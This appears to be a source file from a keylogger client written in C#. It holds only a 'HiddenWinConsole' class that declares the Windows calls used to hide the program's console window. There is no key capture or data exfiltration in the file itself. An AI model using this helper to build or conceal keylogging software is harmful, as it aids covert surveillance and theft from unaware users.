using System;
using System.Runtime.InteropServices;

namespace keylogger_client
{
    public class HiddenWinConsole
    {
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
    }
}
